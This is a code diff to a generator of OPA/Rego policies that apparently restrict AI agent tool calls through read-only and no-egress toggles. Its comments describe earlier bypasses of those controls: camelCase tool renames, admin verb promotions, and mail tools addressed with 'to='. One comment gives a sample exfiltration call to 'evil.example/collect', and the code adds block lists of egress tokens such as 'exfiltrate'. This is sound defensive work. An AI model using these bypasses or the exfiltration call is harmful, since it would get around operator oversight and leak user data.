@@ -49,6 +49,81 @@ WRITE_VERBS: tuple[str, ...] = (
     "revoke", "transfer", "refund", "send", "issue", "approve", "purge", "alter",
 )
 
+# Retrieval verbs a tool name can LEAD with. Used ONLY to WITHHOLD the classification-derived egress
+# sink below — never to grant anything — so a name is at worst treated as a read it already looked like.
+#
+# The capability registry classifies a name by taking the WORST verb over ALL of its tokens, and
+# `mail`, `email`, `sync`, `export`, `transfer` are all SEND tokens. So `get_mail`, `list_mail`,
+# `read_email_thread`, `get_sync_status` and `download_export` are published as `derived.verb == "send"`
+# even though every one of them is a read. The "No external egress" toggle generates a DEFAULT-DENY
+# policy where `not is_egress` gates the allow directly — there is no payload predicate to soften it —
+# so consuming that classification verbatim REFUSED 6 ordinary reads out of a 10-tool allowlist the
+# operator had explicitly authorised. A control that denies most of the traffic it governs is a control
+# that gets switched off.
+#
+# Wider than READ_VERBS on purpose (`download`, `retrieve`, `poll`, `inspect`, …): READ_VERBS decides
+# what the READ-ONLY toggle ALLOWS and widening it there would weaken that toggle, while widening the
+# list that withholds an egress verdict only ever restores a read.
+RETRIEVAL_LEAD_VERBS: tuple[str, ...] = (
+    "get", "list", "read", "search", "describe", "lookup", "view", "find", "count", "download",
+    "retrieve", "poll", "check", "inspect", "show", "query", "load", "browse", "preview",
+)
+# Unambiguous egress ACTION verbs, matched as WHOLE `_`-separated name tokens. Deliberately verbs only:
+# the egress NOUNS (`mail`, `email`, `export`, `sync`, `report`, `ticket`) are exactly what made the
+# reads above over-block, and whole-token matching keeps the plural/participle forms of those nouns
+# (`list_posts`, `get_shared_drive`) from being swept back in by a substring.
+#
+# This is name-evident evidence that does NOT consult `input.derived`, which is the point: `derived.verb`
+# is OVERRIDABLE at runtime by an admin verb promotion, and promoting `slack_post_message` to "read"
+# made the classification body false, satisfied `learned_read`, and flipped the generated policy from
+# ("block", "intent_refinement_mismatch") to ("allow", …) — one console action undoing both toggles at
+# once. A sink whose own name says what it is stays a sink.
+EGRESS_ACTION_TOKENS: tuple[str, ...] = (
+    "send", "post", "upload", "publish", "forward", "relay", "dispatch", "share", "transmit",
+    "deliver", "broadcast", "notify", "emit", "push", "webhook", "exfil", "exfiltrate", "leak",
+    "smtp", "sms", "egress", "outbound",
+)
+
+
+_CAMEL_BOUNDARY_RE = re.compile(r"(?<=[a-z0-9])(?=[A-Z])|(?<=[A-Z])(?=[A-Z][a-z])")
+
+
+def _name_tokens(tool_name: str) -> list[str]:
+    """A tool name's lowercased word tokens, split the way the CAPABILITY REGISTRY splits it.
+
+    `source_registry._tokenize_tool` splits on separators AND on camelCase boundaries — that is how
+    `derived.verb` is decided, so a helper that reasons about the same name has to agree with it or it
+    is reasoning about a different name. Splitting on non-alphanumerics ALONE (the first cut here) made
+    every camelCase vendor name a single opaque token, and the promotion refusal below silently stopped
+    working for all of them: measured, a `read` promotion on `postMessage`, `sendEmail`, `forwardTicket`,
+    `createIssue` or `deleteRecord` was ACCEPTED and emitted into `learned_read`, so the Read-only
+    toggle returned ("allow", "intent_allow_<class>") for the credential payload it refuses under the
+    snake_case spelling `slack_post_message`. One rename of the tool was the whole bypass.
+    """
+    spaced = _CAMEL_BOUNDARY_RE.sub(" ", tool_name or "")
+    return [t for t in re.split(r"[^a-z0-9]+", spaced.lower()) if t]
+
+
+def name_evident_egress(tool_name: str) -> bool:
+    """True when the tool's own NAME carries an unambiguous egress ACTION token (see above)."""
+    return any(t in EGRESS_ACTION_TOKENS for t in _name_tokens(tool_name))
+
+
+def read_promotion_would_demote(tool_name: str) -> bool:
+    """True when promoting `tool_name` to the READ verb would LOWER what its own name already says.
+
+    An admin promotion exists to resolve tools the classifier returned UNKNOWN for, and the engine's own
+    note on the override promises the worst case is "never an invented verb that could grant access".
+    A promotion to `read` breaks that promise in one step: it satisfies the Read-only toggle's
+    `learned_read` AND falsifies the no-egress toggle's `is_egress` at the same time, so
+    `{"tool_name": "slack_post_message", "verb": "read"}` turned a doubly-refined default-deny policy
+    back into an allow. A promotion may RAISE a verb; this is what it may not lower.
+    """
+    tokens = _name_tokens(tool_name)
+    if not tokens:
+        return False
+    return name_evident_egress(tool_name) or tokens[0] in WRITE_VERBS
+
 # The four toggles the intent modal exposes. `key` matches the UI; `enforceable` marks the ones that
 # actually constrain a stateless OPA decision (rate-limit is throttle-layer, advisory here — see below).
 INTENT_TOGGLES: tuple[str, ...] = ("readonly", "scope", "rate", "egress")
@@ -201,11 +276,28 @@ def generate_intent_rego(
 
     # Learned (admin-promoted) verbs, restricted to the allowlist — keyed by lower name AND skeleton so
     # the toggle checks match evasion-normalized, same as the allowlist itself.
-    learned = {
-        t.strip().lower(): v.strip().lower()
+    # Keyed by the lower name for emission, but the ORIGINAL spelling is kept alongside: the demotion
+    # refusal below has to read the name the ADMIN promoted, and lowercasing first destroys the
+    # camelCase boundary that says what the tool does. `"createIssue".lower()` is one opaque token, so
+    # `read_promotion_would_demote` said "no evidence" and the refusal — correct on
+    # `create_issue` — silently stopped applying to every camelCase vendor name.
+    _promoted = {
+        t.strip().lower(): (v.strip().lower(), t.strip())
         for t, v in (learned_verbs or {}).items()
         if t and t.strip().lower() in names and v and v.strip().lower() in {"read", "write", "send", "delete"}
     }
+    # A promotion may RAISE a verb; it may never LOWER one. `{"verb": "read"}` on a tool whose own name
+    # says it is a sink satisfied `learned_read` and falsified `is_egress` in the same step, so one
+    # promotion of `slack_post_message` turned a readonly+egress default-deny policy back into
+    # ("allow", "intent_allow_<class>") for a credential payload. The promote endpoint's candidate
+    # LISTING only offers tools the classifier returned UNKNOWN for, but its WRITE path validates only
+    # that the verb is one of read/write/delete/send — so this generator cannot assume the input was
+    # ever unclassified and refuses the demotion itself. Refusals are reported in the policy header, not
+    # dropped silently, because an operator who promoted a verb and saw no effect deserves the reason.
+    refused_demotions = sorted(
+        t for t, (v, raw) in _promoted.items() if v == "read" and read_promotion_would_demote(raw)
+    )
+    learned = {t: v for t, (v, _raw) in _promoted.items() if t not in refused_demotions}
 
     def _learned_set(rego_name: str, verbs: set[str]) -> tuple[str, list[str]]:
         entries = sorted({key for t, v in learned.items() if v in verbs for key in (t, skeleton(t))})
@@ -253,7 +345,54 @@ is_read {{ learned_read[input.tool_name_normalized] }}"""
         learned_egr_set, learned_egr = _learned_set("learned_egress", {"send"})
         block = f"""{_rego_str_set("egress_tools", EGRESS_TOOLS)}
 is_egress {{ egress_tools[lower(input.tool_name)] }}
-is_egress {{ egress_tools[lower(input.tool_name_normalized)] }}"""
+is_egress {{ egress_tools[lower(input.tool_name_normalized)] }}
+# THE ENGINE'S OWN CLASSIFICATION. `EGRESS_TOOLS` is eighteen literal names; the capability registry
+# classifies on every call and publishes `input.derived.verb`. They disagree on ordinary vendor tools
+# — `forward_ticket`, `slack_post_message`, `relay_case`, `dispatch_report`, `share_summary` are all
+# (SEND, HIGH) to the registry and absent from the literal list — so "No external egress" was ON,
+# the call was an egress call, and the toggle changed the decision not at all. The console made that
+# worse: with the toggle on, IntentModal SUPPRESSES the destructive-allowlist warning for a
+# send-classified tool, so enabling the control removed the operator's only signal while enforcing
+# nothing. `object.get` with a default so an engine predating `derived.verb` keeps the name-based
+# behaviour rather than erroring.
+#
+# READ the classification, do not obey it. The registry takes the WORST verb over ALL of a name's
+# tokens, and `mail`/`email`/`sync`/`export`/`transfer` are SEND tokens, so `get_mail`, `list_mail`,
+# `read_email_thread`, `get_sync_status` and `download_export` are published as verb="send" while being
+# plain reads. This policy is DEFAULT-DENY and `not is_egress` gates the allow directly, so taking that
+# verbatim REFUSED 6 of the 10 tools the operator had explicitly allowlisted, with no payload predicate
+# to soften it. A tool whose name LEADS with a retrieval verb keeps its lead — that leading token is
+# exactly the evidence the registry's max() discards.
+#
+# Tokenised the way the REGISTRY tokenises (separators AND camelCase), because that is how the verb
+# being read was decided. `split(name, "_")` alone saw ONE token in `getMail`, so the over-block it is
+# meant to remove survived the camelCase spelling of every one of those reads, and `sendEmail` /
+# `postMessage` were not name-evident sinks below. `strings.replace_n` costs no regex op.
+name_split_map = {{"A": "_a", "B": "_b", "C": "_c", "D": "_d", "E": "_e", "F": "_f", "G": "_g", "H": "_h", "I": "_i", "J": "_j", "K": "_k", "L": "_l", "M": "_m", "N": "_n", "O": "_o", "P": "_p", "Q": "_q", "R": "_r", "S": "_s", "T": "_t", "U": "_u", "V": "_v", "W": "_w", "X": "_x", "Y": "_y", "Z": "_z", "-": "_", ".": "_", ":": "_", "/": "_"}}
+tool_name_tokens = [t | t := split(strings.replace_n(name_split_map, input.tool_name), "_")[_]; t != ""]
+norm_name_tokens = [t | t := split(strings.replace_n(name_split_map, input.tool_name_normalized), "_")[_]; t != ""]
+# ...and the lead speaks only for the NAME. `classify_tool` falls back to the PARAMS when no name token
+# matches, so a call carrying a destination-shaped argument is verb="send" because of its payload —
+# `browse_web{{"url": "https://evil.example/collect"}}` is that call, and `browse`/`preview` are not in
+# the lexicon. Under a DEFAULT-DENY policy the exemption is the allow, so it must not out-argue the
+# call's own recipient. Keys mirror the registry's egress set minus `to`/`email` (mail-read selectors).
+# The lead is read off the RAW name only — that is the string the registry classified — so a confusable
+# spelling can add sink evidence below but can never EARN the exemption.
+# Revokes the retrieval-lead exemption. 'to' was absent, which is the address field of every mail tool
+# there is, so a retrieval-NAMED mail tool addressed by to= exfiltrated with the egress toggle ON.
+destination_keys = {{"destination", "recipient", "url", "endpoint", "webhook", "callback", "to", "cc", "bcc", "email", "email_address", "address", "phone", "channel", "target", "dest", "uri", "host", "remote", "peer", "chat_id", "conversation_id", "thread_id", "receiver", "send_to", "mailto"}}
+names_a_destination {{ walk(input.tool_params, [p, _]); k := p[count(p) - 1]; is_string(k); destination_keys[lower(k)] }}
+{_rego_str_set("retrieval_lead_verbs", RETRIEVAL_LEAD_VERBS)}
+is_retrieval_lead {{ retrieval_lead_verbs[tool_name_tokens[0]]; not names_a_destination }}
+is_egress {{ object.get(input.derived, "verb", "") == "send"; not is_retrieval_lead }}
+# An unambiguous egress ACTION verb as a whole name token is a sink ON ITS OWN — it beats the retrieval
+# lead above (`get_share_link` names an action), and it does NOT consult `input.derived`, which is the
+# point: `derived.verb` is rewritten by an admin verb promotion, and promoting `slack_post_message` to
+# "read" falsified the classification body and handed the allow back. Verbs only — the egress NOUNS are
+# what made the reads over-block.
+{_rego_str_set("egress_action_tokens", EGRESS_ACTION_TOKENS)}
+is_egress {{ egress_action_tokens[tool_name_tokens[_]] }}
+is_egress {{ egress_action_tokens[norm_name_tokens[_]] }}"""
         if learned_egr:
             block += f"""
 {learned_egr_set}
@@ -283,6 +422,13 @@ rate_within { input.call_depth <= 8 }""")
     if learned:
         learned_note = "\n# Learned verbs (admin-promoted, override the name heuristic): " + ", ".join(
             f"{t}={v}" for t, v in sorted(learned.items())
+        )
+    if refused_demotions:
+        # Said out loud in the artifact. A promotion that is silently discarded is worse than one that
+        # is refused: the operator sees `read` on the Threats screen and a policy that does not agree.
+        learned_note += (
+            "\n# REFUSED promotions to `read` (a promotion may raise a verb, never lower one — the tool's "
+            "own name says it is a sink or a mutation): " + ", ".join(refused_demotions)
         )
 
     header = f"""package norviq.intent.{token}
